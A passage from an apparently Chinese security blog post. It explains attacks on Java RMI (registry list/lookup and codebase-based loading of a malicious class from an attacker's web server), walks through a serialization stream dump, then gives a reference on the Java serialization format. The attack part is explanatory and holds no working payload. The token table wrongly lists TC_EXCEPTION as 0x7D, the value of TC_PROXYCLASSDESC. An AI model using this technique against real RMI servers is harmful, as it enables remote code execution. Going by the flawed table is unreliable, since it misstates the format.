<code>Remote</code> 的接口表示该接口中的方法可以通过 RMI 在远程调用。</p><h1 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h1><h2 id="攻击RMI-Registry"><a href="#攻击RMI-Registry" class="headerlink" title="攻击RMI Registry"></a>攻击RMI Registry</h2><p>限制：只能localhost源才能访问rebind，bind，unbind方法。</p><p>但是能用的是：list 和 lookup方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String[] s = Naming.list(<span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;可用类：&quot;</span>+ Arrays.toString(s));</span><br><span class="line"></span><br><span class="line"><span class="comment">//可用类：[//localhost:1099/hello]</span></span><br><span class="line"></span><br><span class="line">如果直接输出s，则会输出：[Ljava.lang.String;@4411d970，是一个不可读的信息</span><br></pre></td></tr></table></figure><p>lookup作用就是获得某个远程对象。</p><p>其实就是这段<img src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20240922185700301.png" alt="image-20240922185700301"></p><p>那么，只要目标服务器上存在一些危险方法，我们通过RMI就可以对其进行调用</p><blockquote><p>当然肯定不会这么简单</p></blockquote><h2 id="RMI利用codebase执行任意代码"><a href="#RMI利用codebase执行任意代码" class="headerlink" title="RMI利用codebase执行任意代码"></a>RMI利用codebase执行任意代码</h2><p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的</p><p>CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p><p>如果我们指定 codebase&#x3D;<a href="http://example.com/">http://example.com/</a> ，然后加载 org.vulhub.example.Example 类，则</p><p>Java虚拟机会下载这个文件 <a href="http://example.com/org/vulhub/example/Example.class">http://example.com/org/vulhub/example/Example.class</a> ，并作为</p><p>Example类的字节码。</p><p>这个时候问题就来了，如果codebase被控制，我们不就可以加载恶意类了吗？</p><p>对，在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去</p><p>CLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。</p><p>不过显然官方也注意到了这一个安全隐患，所以只有满足如下条件的RMI服务器才能被攻击：</p><ul><li><p>安装并配置了SecurityManager</p></li><li><p>Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly&#x3D;false</p></li></ul><p>其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置：</p><p><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html</a></p><p><a href="https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></p><p>官方将 java.rmi.server.useCodebaseOnly 的默认值由 false 改为了 true 。在</p><p>java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的</p><p>codebase ，不再支持从RMI请求中获取。</p><blockquote><p>查看example.com的日志，可见收到了来自Java的请求 &#x2F;RMIClient$Payload.class 。因为我们还没</p><p>有实际放置这个类文件，所以上面出现了异常：</p><p>我们只需要编译一个恶意类，将其class文件放置在Web服务器的 &#x2F;RMIClient$Payload.class 即可。</p></blockquote><h2 id="在java序列化流里加入codebase"><a href="#在java序列化流里加入codebase" class="headerlink" title="在java序列化流里加入codebase"></a>在java序列化流里加入codebase</h2><p>通过查看序列化流数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Contents</span><br><span class="line">TC_BLOCKDATA - <span class="number">0x77</span></span><br><span class="line">Length - <span class="number">15</span> - <span class="number">0x0f</span></span><br><span class="line">Contents - <span class="number">0x01a4462ec50000016d8d8d63578008</span></span><br><span class="line">TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">TC_PROXYCLASSDESC - <span class="number">0x7d</span></span><br><span class="line">newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">00</span></span><br><span class="line">Interface count - <span class="number">2</span> - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">02</span></span><br><span class="line">proxyInterfaceNames</span><br><span class="line"><span class="number">0</span>:</span><br><span class="line">Length - <span class="number">15</span> - <span class="number">0x00</span> <span class="number">0f</span></span><br><span class="line">Value - java.rmi.Remote - <span class="number">0x6a6176612e726d692e52656d6f7465</span></span><br><span class="line"><span class="number">1</span>:</span><br><span class="line">Length - <span class="number">5</span> - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Value - ICalc - <span class="number">0x4943616c63</span></span><br><span class="line">classAnnotations</span><br><span class="line">TC_NULL - <span class="number">0x70</span></span><br><span class="line">TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">superClassDesc</span><br><span class="line">TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">className</span><br><span class="line">Length - <span class="number">23</span> - <span class="number">0x00</span> <span class="number">17</span></span><br><span class="line">Value - java.lang.reflect.Proxy -</span><br><span class="line"><span class="number">0x6a6176612e6c616e672e7265666c6563742e50726f7879</span></span><br><span class="line">serialVersionUID - <span class="number">0xe1</span> <span class="number">27</span> da <span class="number">20</span> cc <span class="number">10</span> <span class="number">43</span> cb</span><br><span class="line">newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">01</span></span><br><span class="line">classDescFlags - <span class="number">0x02</span> - SC_SERIALIZABLE</span><br><span class="line">fieldCount - <span class="number">1</span> - <span class="number">0x00</span> <span class="number">01</span></span><br><span class="line">Fields</span><br><span class="line"><span class="number">0</span>:</span><br><span class="line">Object - L - <span class="number">0x4c</span></span><br><span class="line">fieldName</span><br><span class="line">Length - <span class="number">1</span> - <span class="number">0x00</span> <span class="number">01</span></span><br><span class="line">Value - h - <span class="number">0x68</span></span><br><span class="line">className1</span><br><span class="line">TC_STRING - <span class="number">0x74</span></span><br><span class="line">newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">02</span></span><br><span class="line">Length - <span class="number">37</span> - <span class="number">0x00</span> <span class="number">25</span></span><br><span class="line">Value - Ljava/lang/reflect/InvocationHandler; -</span><br><span class="line"><span class="number">0x4c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723</span></span><br><span class="line">b</span><br><span class="line">classAnnotations</span><br><span class="line">TC_NULL - <span class="number">0x70</span></span><br><span class="line">TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">superClassDesc</span><br><span class="line">TC_NULL - <span class="number">0x70</span></span><br><span class="line">newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">03</span></span><br><span class="line">classdata</span><br><span class="line">java.lang.reflect.Proxy</span><br><span class="line">values</span><br><span class="line"><span class="title function_">h</span></span><br><span class="line"><span class="params">(object)</span></span><br><span class="line">TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">className</span><br><span class="line">Length - <span class="number">45</span> - <span class="number">0x00</span> <span class="number">2d</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">Value - java.rmi.server.RemoteObjectInvocationHandler -</span><br><span class="line"><span class="number">0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696</span></span><br><span class="line">f6e48616e646c6572</span><br><span class="line">serialVersionUID - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">02</span></span><br><span class="line">newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">04</span></span><br><span class="line">classDescFlags - <span class="number">0x02</span> - SC_SERIALIZABLE</span><br><span class="line">fieldCount - <span class="number">0</span> - <span class="number">0x00</span> <span class="number">00</span></span><br><span class="line">classAnnotations</span><br><span class="line">TC_NULL - <span class="number">0x70</span></span><br><span class="line">TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">superClassDesc</span><br><span class="line">TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">className</span><br><span class="line">Length - <span class="number">28</span> - <span class="number">0x00</span> 1c</span><br><span class="line">Value - java.rmi.server.RemoteObject -</span><br><span class="line"><span class="number">0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374</span></span><br><span class="line">serialVersionUID - <span class="number">0xd3</span> <span class="number">61</span> b4 <span class="number">91</span> 0c <span class="number">61</span> <span class="number">33</span> 1e</span><br><span class="line">newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">05</span></span><br><span class="line">classDescFlags - <span class="number">0x03</span> - SC_WRITE_METHOD |</span><br><span class="line">SC_SERIALIZABLE</span><br><span class="line">fieldCount - <span class="number">0</span> - <span class="number">0x00</span> <span class="number">00</span></span><br><span class="line">classAnnotations</span><br><span class="line">TC_NULL - <span class="number">0x70</span></span><br><span class="line">TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">superClassDesc</span><br><span class="line">TC_NULL - <span class="number">0x70</span></span><br><span class="line">newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">06</span></span><br><span class="line">classdata</span><br><span class="line">java.rmi.server.RemoteObject</span><br><span class="line">values</span><br><span class="line">objectAnnotation</span><br><span class="line">TC_BLOCKDATA - <span class="number">0x77</span></span><br><span class="line">Length - <span class="number">55</span> - <span class="number">0x37</span></span><br><span class="line">Contents -</span><br><span class="line"><span class="number">0x000a556e6963617374526566000e3134302e3233382e33342e3231360000fa00276c05080</span></span><br><span class="line">63e8d45a4462ec50000016d8d8d6357800101</span><br><span class="line">TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">java.rmi.server.RemoteObjectInvocationHandler</span><br><span class="line">values</span><br></pre></td></tr></table></figure><p>这是一个 java.lang.reflect.Proxy 对象，其中有一段数据储存在 objectAnnotation 中：</p><p>0x000a556e6963617374526566000e3134302e3233382e33342e3231360000fa00276c0508063e8d45a</p><p>4462ec50000016d8d8d6357800101 ，记录了RMI Server的地址和端口。</p><p>再看RMI Call回来的数据包</p><p><img src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20240924210814936.png" alt="image-20240924210814936"></p><p>可以看出我们的 codebase 是通过 [Ljava.rmi.server.ObjID; 的 classAnnotations 传递的。</p><p>所以，即使我们没有RMI的客户端，只需要修改 classAnnotations 的值，就能控制codebase，使其</p><p>指向攻击者的恶意网站。</p><h2 id="classAnnotations（类注释"><a href="#classAnnotations（类注释" class="headerlink" title="classAnnotations（类注释"></a>classAnnotations（类注释</h2><p>众所周知，在序列化Java类的时候用到了一个类，叫 ObjectOutputStream 。这个类内部有一个方法<code>annotateClass </code>，<code> ObjectOutputStream</code> 的子类有需要<code>向序列化后</code>的<code>数据</code>里放任何内容，都可以重写这个方法，写入你自己想要写入的数据。然后反序列化时，就可以读取到这个信息并使用。</p><p>比如，我们RMI的类 MarshalOutputStream 就将当前的 codebase 写入：<a href="https://github.com/JetBrains/jdk8u_jdk/blob/8db9d62a1cfe07fd4260b83ae86e39f80c0a9ff2/">https://github.com/JetBrains/jdk8u_jdk/blob/8db9d62a1cfe07fd4260b83ae86e39f80c0a9ff2/</a></p><p>src&#x2F;share&#x2F;classes&#x2F;java&#x2F;rmi&#x2F;server&#x2F;RMIClassLoader.java#L657</p><p><img src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20240924211301413.png" alt="image-20240924211301413"></p><p><a href="https://github.com/JetBrains/jdk8u_jdk/blob/8db9d62a1c/src/share/classes/sun/rmi/server/">https://github.com/JetBrains/jdk8u_jdk/blob/8db9d62a1c/src/share/classes/sun/rmi/server/</a></p><p>LoaderHandler.java#L282</p><p>所以，我们在分析序列化数据时看到的 classAnnotations ，实际上就是 annotateClass 方法写入的</p><p>内容。</p><h1 id="Java-序列化流格式详解"><a href="#Java-序列化流格式详解" class="headerlink" title="Java 序列化流格式详解"></a>Java 序列化流格式详解</h1><hr><p>Java 序列化机制允许将对象的状态转换为字节流，以便保存到文件、数据库或通过网络传输。为了实现序列化，Java 定义了一套特定的二进制流格式，称为 <strong>序列化流格式（Serialization Stream Format）</strong>。理解这个格式对于深入理解 Java 序列化机制、调试序列化问题以及防范反序列化漏洞都有重要意义。</p><p>本文将详细解释序列化流格式中的各个组成部分，包括各个标记（Token）和数据结构。</p><hr><h2 id="一、序列化流的整体结构"><a href="#一、序列化流的整体结构" class="headerlink" title="一、序列化流的整体结构"></a>一、序列化流的整体结构</h2><p>序列化流由以下几个主要部分组成：</p><ol><li><strong>Stream Header（流头部）</strong>：标识序列化流的开始，包括魔数和版本号。</li><li><strong>Contents（内容）</strong>：序列化的对象和数据。</li></ol><hr><h3 id="1-Stream-Header（流头部）"><a href="#1-Stream-Header（流头部）" class="headerlink" title="1. Stream Header（流头部）"></a><strong>1. Stream Header（流头部）</strong></h3><ul><li><strong>Magic（魔数）</strong>：前两个字节，固定值 <code>0xAC ED</code>，用于标识这是一个 Java 序列化流。</li><li><strong>Version（版本号）</strong>：接下来的两个字节，通常为 <code>0x00 05</code>，表示序列化流的版本。</li></ul><p><strong>示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Magic:    0xAC ED</span><br><span class="line">Version:  0x00 05</span><br></pre></td></tr></table></figure><hr><h3 id="2-Contents（内容）"><a href="#2-Contents（内容）" class="headerlink" title="2. Contents（内容）"></a><strong>2. Contents（内容）</strong></h3><p><strong>Contents</strong> 包含一个或多个 <strong>Content</strong>，每个 <strong>Content</strong> 可以是一个对象、块数据或控制标记。</p><hr><h2 id="二、详细结构解析"><a href="#二、详细结构解析" class="headerlink" title="二、详细结构解析"></a>二、详细结构解析</h2><h3 id="Contents"><a href="#Contents" class="headerlink" title="Contents"></a><strong>Contents</strong></h3><ul><li><strong>Contents</strong> ::&#x3D; <strong>Content</strong> <em>[Contents Content]</em></li></ul><p>也就是说，<strong>Contents</strong> 是由多个 <strong>Content</strong> 组成的序列。</p><h3 id="Content"><a href="#Content" class="headerlink" title="Content"></a><strong>Content</strong></h3><ul><li><strong>Content</strong> ::&#x3D; <strong>Object</strong> | <strong>BlockData</strong></li></ul><p><strong>Content</strong> 可以是一个对象或者块数据。</p><hr><h3 id="Object"><a href="#Object" class="headerlink" title="Object"></a><strong>Object</strong></h3><ul><li><strong>Object</strong> ::&#x3D; <strong>newObject</strong> | <strong>newClass</strong> | <strong>newArray</strong> | <strong>newString</strong> | <strong>newEnum</strong> | <strong>newClassDesc</strong> | <strong>prevObject</strong> | <strong>nullReference</strong> | <strong>exception</strong> | <strong>TC_RESET</strong></li></ul><p><strong>Object</strong> 可以是以下类型之一：</p><ol><li><strong>newObject</strong>：一个新的对象实例。</li><li><strong>newClass</strong>：一个新的类对象。</li><li><strong>newArray</strong>：一个新的数组对象。</li><li><strong>newString</strong>：一个新的字符串对象。</li><li><strong>newEnum</strong>：一个新的枚举对象。</li><li><strong>newClassDesc</strong>：一个新的类描述符。</li><li><strong>prevObject</strong>：对先前对象的引用。</li><li><strong>nullReference</strong>：空引用。</li><li><strong>exception</strong>：异常对象。</li><li><strong>TC_RESET</strong>：重置流上下文。</li></ol><hr><h3 id="BlockData"><a href="#BlockData" class="headerlink" title="BlockData"></a><strong>BlockData</strong></h3><ul><li><strong>BlockData</strong> ::&#x3D; <strong>blockdataShort</strong> | <strong>blockdataLong</strong></li></ul><p><strong>BlockData</strong> 是序列化流中的块数据，可以是短块数据或长块数据。</p><hr><h2 id="三、各个标记和结构详解"><a href="#三、各个标记和结构详解" class="headerlink" title="三、各个标记和结构详解"></a>三、各个标记和结构详解</h2><h3 id="1-Magic（魔数）和-Version（版本号）"><a href="#1-Magic（魔数）和-Version（版本号）" class="headerlink" title="1. Magic（魔数）和 Version（版本号）"></a><strong>1. Magic（魔数）和 Version（版本号）</strong></h3><ul><li><strong>Magic</strong>：<code>0xAC ED</code>（16 进制），表示序列化流的开始。</li><li><strong>Version</strong>：<code>0x00 05</code>，表示序列化协议的版本。</li></ul><h3 id="2-TC-标记"><a href="#2-TC-标记" class="headerlink" title="2. TC_ 标记*"></a><em><em>2. TC_</em> 标记</em>*</h3><p>序列化流使用了一系列的标记（Token），以 <code>TC_</code> 开头，用于标识不同的类型和操作。</p><hr><h3 id="3-Object-类型详解"><a href="#3-Object-类型详解" class="headerlink" title="3. Object 类型详解"></a><strong>3. Object 类型详解</strong></h3><h4 id="1-newObject"><a href="#1-newObject" class="headerlink" title="(1) newObject"></a><strong>(1) newObject</strong></h4><ul><li><strong>语法</strong>：<code>TC_OBJECT classDesc newHandle classdata[]</code></li><li><strong>解释</strong>：<ul><li><strong>TC_OBJECT</strong>：标记，值为 <code>0x73</code>，表示一个新对象的开始。</li><li><strong>classDesc</strong>：类描述符，描述对象的类信息。</li><li><strong>newHandle</strong>：新对象的句柄，用于引用此对象。</li><li>**classdata[]**：对象的数据，包括父类的数据。</li></ul></li></ul><h4 id="2-newClass"><a href="#2-newClass" class="headerlink" title="(2) newClass"></a><strong>(2) newClass</strong></h4><ul><li><strong>语法</strong>：<code>TC_CLASS classDesc newHandle</code></li><li><strong>解释</strong>：<ul><li><strong>TC_CLASS</strong>：标记，值为 <code>0x76</code>，表示一个新类对象。</li><li><strong>classDesc</strong>：类描述符。</li><li><strong>newHandle</strong>：新对象的句柄。</li></ul></li></ul><h4 id="3-newArray"><a href="#3-newArray" class="headerlink" title="(3) newArray"></a><strong>(3) newArray</strong></h4><ul><li><strong>语法</strong>：<code>TC_ARRAY classDesc newHandle (int)length values[]</code></li><li><strong>解释</strong>：<ul><li><strong>TC_ARRAY</strong>：标记，值为 <code>0x75</code>，表示一个新数组对象。</li><li><strong>classDesc</strong>：数组的类描述符。</li><li><strong>newHandle</strong>：新对象的句柄。</li><li><strong>length</strong>：数组长度。</li><li>**values[]**：数组元素。</li></ul></li></ul><h4 id="4-newString"><a href="#4-newString" class="headerlink" title="(4) newString"></a><strong>(4) newString</strong></h4><ul><li><strong>语法</strong>：<ul><li><strong>短字符串</strong>：<code>TC_STRING newHandle (utf)</code><ul><li><strong>TC_STRING</strong>：标记，值为 <code>0x74</code>。</li><li>**(utf)**：使用 UTF-8 编码的字符串。</li></ul></li><li><strong>长字符串</strong>：<code>TC_LONGSTRING newHandle (long-utf)</code><ul><li><strong>TC_LONGSTRING</strong>：标记，值为 <code>0x7C</code>。</li><li>**(long-utf)**：使用长 UTF-8 编码的字符串。</li></ul></li></ul></li></ul><h4 id="5-newEnum"><a href="#5-newEnum" class="headerlink" title="(5) newEnum"></a><strong>(5) newEnum</strong></h4><ul><li><strong>语法</strong>：<code>TC_ENUM classDesc newHandle enumConstantName</code></li><li><strong>解释</strong>：<ul><li><strong>TC_ENUM</strong>：标记，值为 <code>0x7E</code>，表示一个新的枚举对象。</li><li><strong>enumConstantName</strong>：枚举常量的名称。</li></ul></li></ul><h4 id="6-newClassDesc"><a href="#6-newClassDesc" class="headerlink" title="(6) newClassDesc"></a><strong>(6) newClassDesc</strong></h4><ul><li><strong>语法</strong>：<code>TC_CLASSDESC className serialVersionUID newHandle classDescInfo</code></li><li><strong>解释</strong>：<ul><li><strong>TC_CLASSDESC</strong>：标记，值为 <code>0x72</code>，表示一个新的类描述符。</li><li><strong>className</strong>：类的完全限定名。</li><li><strong>serialVersionUID</strong>：类的序列化版本号。</li><li><strong>classDescInfo</strong>：类描述符信息。</li></ul></li></ul><h4 id="7-prevObject"><a href="#7-prevObject" class="headerlink" title="(7) prevObject"></a><strong>(7) prevObject</strong></h4><ul><li><strong>语法</strong>：<code>TC_REFERENCE (int)handle</code></li><li><strong>解释</strong>：<ul><li><strong>TC_REFERENCE</strong>：标记，值为 <code>0x71</code>，表示对先前对象的引用。</li><li><strong>handle</strong>：先前对象的句柄。</li></ul></li></ul><h4 id="8-nullReference"><a href="#8-nullReference" class="headerlink" title="(8) nullReference"></a><strong>(8) nullReference</strong></h4><ul><li><strong>语法</strong>：<code>TC_NULL</code></li><li><strong>解释</strong>：<ul><li><strong>TC_NULL</strong>：标记，值为 <code>0x70</code>，表示一个空引用。</li></ul></li></ul><h4 id="9-exception"><a href="#9-exception" class="headerlink" title="(9) exception"></a><strong>(9) exception</strong></h4><ul><li><strong>语法</strong>：<code>TC_EXCEPTION exceptionObject</code></li><li><strong>解释</strong>：<ul><li><strong>TC_EXCEPTION</strong>：标记，值为 <code>0x7D</code>，表示一个异常对象。</li><li><strong>exceptionObject</strong>：异常对象的序列化数据。</li></ul></li></ul><h4 id="10-TC-RESET"><a href="#10-TC-RESET" class="headerlink" title="(10) TC_RESET"></a><strong>(10) TC_RESET</strong></h4><ul><li><strong>语法</strong>：<code>TC_RESET</code></li><li><strong>解释</strong>：<ul><li><strong>TC_RESET</strong>：标记，值为 <code>0x79</code>，表示重置流上下文。</li></ul></li></ul><hr><h3 id="4-BlockData-类型详解"><a href="#4-BlockData-类型详解" class="headerlink" title="4. BlockData 类型详解"></a><strong>4. BlockData 类型详解</strong></h3><h4 id="1-blockdataShort"><a href="#1-blockdataShort" class="headerlink" title="(1) blockdataShort"></a><strong>(1) blockdataShort</strong></h4><ul><li><strong>语法</strong>：<code>TC_BLOCKDATA (unsigned byte)size (byte)[size]</code></li><li><strong>解释</strong>：<ul><li><strong>TC_BLOCKDATA</strong>：标记，值为 <code>0x77</code>，表示块数据的开始。</li><li><strong>size</strong>：后续数据的长度，范围为 0 到 255。</li><li>**(byte)[size]**：实际的数据字节。</li></ul></li></ul><h4 id="2-blockdataLong"><a href="#2-blockdataLong" class="headerlink" title="(2) blockdataLong"></a><strong>(2) blockdataLong</strong></h4><ul><li><strong>语法</strong>：<code>TC_BLOCKDATALONG (int)size (byte)[size]</code></li><li><strong>解释</strong>：<ul><li><strong>TC_BLOCKDATALONG</strong>：标记，值为 <code>0x7A</code>，用于长度超过 255 的块数据。</li><li><strong>size</strong>：后续数据的长度，范围为 0 到 2^32-1。</li><li>**(byte)[size]**：实际的数据字节。</li></ul></li></ul><hr><h2 id="四、序列化过程中的句柄（Handle）"><a href="#四、序列化过程中的句柄（Handle）" class="headerlink" title="四、序列化过程中的句柄（Handle）"></a>四、序列化过程中的句柄（Handle）</h2><p>在序列化过程中，每个新创建的对象都会分配一个句柄，用于引用该对象。这有助于处理对象共享和循环引用。</p><ul><li><strong>句柄值的起始值</strong>：<code>0x7E0000</code></li><li><strong>句柄值</strong>：每创建一个新对象，句柄值递增。</li></ul><hr><h2 id="五、标记（Token）及其对应的十六进制值"><a href="#五、标记（Token）及其对应的十六进制值" class="headerlink" title="五、标记（Token）及其对应的十六进制值"></a>五、标记（Token）及其对应的十六进制值</h2><table><thead><tr><th>标记名</th><th>值（十六进制）</th><th>描述</th></tr></thead><tbody><tr><td><strong>TC_NULL</strong></td><td><code>0x70</code></td><td>空引用</td></tr><tr><td><strong>TC_REFERENCE</strong></td><td><code>0x71</code></td><td>对先前对象的引用</td></tr><tr><td><strong>TC_CLASSDESC</strong></td><td><code>0x72</code></td><td>类描述符</td></tr><tr><td><strong>TC_OBJECT</strong></td><td><code>0x73</code></td><td>新对象</td></tr><tr><td><strong>TC_STRING</strong></td><td><code>0x74</code></td><td>新字符串（短字符串）</td></tr><tr><td><strong>TC_ARRAY</strong></td><td><code>0x75</code></td><td>新数组</td></tr><tr><td><strong>TC_CLASS</strong></td><td><code>0x76</code></td><td>新类对象</td></tr><tr><td><strong>TC_BLOCKDATA</strong></td><td><code>0x77</code></td><td>块数据（短）</td></tr><tr><td><strong>TC_ENDBLOCKDATA</strong></td><td><code>0x78</code></td><td>块数据结束</td></tr><tr><td><strong>TC_RESET</strong></td><td><code>0x79</code></td><td>重置流上下文</td></tr><tr><td><strong>TC_BLOCKDATALONG</strong></td><td><code>0x7A</code></td><td>块数据（长）</td></tr><tr><td><strong>TC_EXCEPTION</strong></td><td><code>0x7D</code></td><td>异常对象</td></tr><tr><td><strong>TC_LONGSTRING</strong></td><td><code>0x7C</code></td><td>新字符串（长字符串）</td></tr><tr><td><strong>TC_PROXYCLASSDESC</strong></td><td><code>0x7D</code></td><td>代理类描述符</td></tr><tr><td><strong>TC_ENUM</strong></td><td><code>0x7E</code></td><td>新枚举对象</td></tr></tbody></table><hr><h2 id="六、具体示例解析"><a href="#六、具体示例解析" class="headerlink" title="六、具体示例解析"></a>六、具体示例解析</h2><h3 id="1-序列化一个字符串"><a href="#1-序列化一个字符串" class="headerlink" title="1. 序列化一个字符串"></a><strong>1. 序列化一个字符串</strong></h3><p>当序列化一个字符串时，可能会使用 <code>TC_STRING</code> 或 <code>TC_LONGSTRING</code>，取决于字符串的长度。</p><h4 id="1-短字符串"><a href="#1-短字符串" class="headerlink" title="(1) 短字符串"></a><strong>(1) 短字符串</strong></h4><ul><li><strong>语法</strong>：<code>TC_STRING newHandle (utf)</code></li><li><strong>步骤</strong>：<ol><li><strong>TC_STRING</strong>：<code>0x74</code></li><li><strong>newHandle</strong>：为字符串分配的新句柄。</li><li>**(utf)**：字符串的 UTF-8 编码。</li></ol></li></ul><h4 id="2-长字符串"><a href="#2-长字符串" class="headerlink" title="(2) 长字符串"></a><strong>(2) 长字符串</strong></h4><ul><li><strong>语法</strong>：<code>TC_LONGSTRING newHandle (long-utf)</code></li><li><strong>步骤</strong>：<ol><li><strong>TC_LONGSTRING</strong>：<code>0x7C</code></li><li><strong>newHandle</strong>：为字符串分配的新句柄。</li><li>**(long-utf)**：字符串的长 UTF-8 编码。</li></ol></li></ul><p><strong>注意</strong>：当字符串长度超过 65535 个字节时，需要使用 <code>TC_LONGSTRING</code>。</p><h3 id="2-序列化一个新对象"><a href="#2-序列化一个新对象" class="headerlink" title="2. 序列化一个新对象"></a><strong>2. 序列化一个新对象</strong></h3><ul><li><strong>语法</strong>：<code>TC_OBJECT classDesc newHandle classdata[]</code></li><li><strong>步骤</strong>：<ol><li><strong>TC_OBJECT</strong>：<code>0x73</code></li><li><strong>classDesc</strong>：类的描述符，包括类名、序列化版本 UID、字段信息等。</li><li><strong>newHandle</strong>：为对象分配的新句柄。</li><li>**classdata[]**：对象的实际数据，根据类的字段顺序写入。</li></ol></li></ul><hr><h2 id="七、序列化流中的异常处理"><a href="#七、序列化流中的异常处理" class="headerlink" title="七、序列化流中的异常处理"></a>七、序列化流中的异常处理</h2><h3 id="1-exception"><a href="#1-exception" class="headerlink" title="1. exception"></a><strong>1. exception</strong></h3><ul><li><strong>语法</strong>：<code>TC_EXCEPTION exceptionObject</code></li><li><strong>解释</strong>：<ul><li>当序列化过程中发生异常时，可以使用 <code>TC_EXCEPTION</code> 标记，后跟异常对象的序列化数据。</li></ul></li></ul><h3 id="2-TC-RESET"><a href="#2-TC-RESET" class="headerlink" title="2. TC_RESET"></a><strong>2. TC_RESET</strong></h3><ul><li><strong>语法</strong>：<code>TC_RESET</code></li><li><strong>解释</strong>：<ul><li><code>TC_RESET</code> 用于重置序列化流的上下文，包括清除对象句柄表。这在需要重新开始对象引用计数时非常有用。</li></ul></li></ul><hr><h2 id="八、特殊标记的作用"><a href="#八、特殊标记的作用" class="headerlink" title="八、特殊标记的作用"></a>八、特殊标记的作用</h2><h3 